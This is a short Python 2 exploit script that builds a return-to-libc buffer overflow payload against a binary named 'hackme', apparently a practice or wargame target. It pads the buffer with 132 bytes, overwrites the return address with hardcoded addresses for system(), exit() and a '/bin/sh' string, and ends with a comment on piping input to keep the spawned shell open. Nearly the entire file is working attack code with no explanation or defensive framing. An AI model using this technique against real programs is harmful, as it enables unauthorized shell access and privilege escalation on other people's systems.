#!/usr/bin/python
import struct 

# Require ret2lib_env.c for dummy environment
#     Tested On hackme 
#
# Exploitation Payload Configurations

buf = "A"*132
pad = "BBBB"            
ebp = "cccc"            # EBP

binsh = 0xbfffffa4      # /bin/sh address
exit_ = 0xb7ec60c0      # exit function call address
syst_ = 0xb7ecffb0      # system function call address

# assemble payload 
payload = buf + pad + ebp + struct.pack("I", syst_) + struct.pack("I", exit_) + struct.pack("I",binsh)


print payload
# To Keep Alive Shell, We need to connect opened stdout, stdin pipe.
# hence, use cat | ./hackme $(cat tmp)

